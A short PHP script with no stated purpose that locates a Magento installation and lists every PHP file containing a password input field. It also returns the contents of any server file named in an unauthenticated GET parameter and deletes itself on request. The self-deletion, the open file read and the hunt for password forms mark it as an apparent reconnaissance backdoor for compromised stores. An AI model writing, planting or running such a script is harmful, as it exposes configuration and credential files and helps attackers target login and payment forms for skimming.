<?PHP

error_reporting(E_ALL);
ini_set('display_errors', 1);

function get_files($path, $i = 0) {
	global $root, $skip_files;

	if (!file_exists($path) || !is_dir($path) || !is_readable($path)) return false;

	$files = array();

	$d = opendir($path);
	while (($f=readdir($d))!==false) {
		if ($f=='.' || $f=='..') continue;
		if (is_dir($fname = $path.'/'.$f)) $files = array_merge($files, get_files($fname, $i + 1));
		elseif (preg_match('/\.([^.]+)$/', $f, $pock)) {
			$ext = strtolower($pock[1]);
			if (
				($ext=='php' || $ext=='inc' || $ext=='php3' || $ext=='phtml') &&
				!isset($skip_files[str_replace($root.'/', '', $fname)])
			) {
				$buf = file_get_contents($fname);
				if (
					stripos($buf, 'type="password"')!==false ||
					stripos($buf, 'type=\'password\'')!==false ||
					stripos($buf, 'type=password')!==false
				) $files[] = $fname;
			}
		}
	}
	closedir($d);

	return $files;
}

if (isset($_GET['f']) && strlen($f = trim($_GET['f']))) {
	if (!file_exists($f)) $content = array('err'=>'file \''.$f.'\' not found');
	elseif (!is_readable($f)) $content = array('err'=>'file \''.$f.'\' is not readable');
	else $content = array('result'=>file_get_contents($f));
} elseif (isset($_GET['del'])) {
	$content = array('result'=>@unlink(__FILE__));
} else {
	$root = null;
	for ($i=0, $sz=10; $i<$sz; $i++) {
		$root = $i?str_repeat('../', $i):'./';
		if (file_exists($root.'app') && file_exists($root.'skin') && file_exists($root.'lib') && file_exists($root.'media')) break;
		else $root = null;
	}

	if (isset($root)) {
		$root = substr($root, 0, strlen($root) - 1);
		$files = get_files($root);
		$content = array('result'=>$files);
		/*$result = 'array(';
		for ($i=0, $sz=sizeof($files); $i<$sz; $i++) $result .= "\r\n".chr(9).'\''.$files[$i].'\'=>1,';
		$result .= "\r\n".');';
		echo $result;*/
	} else $content = array('err'=>'magento not found');
}

header('Content-type: application/json');
echo json_encode($content);

?>
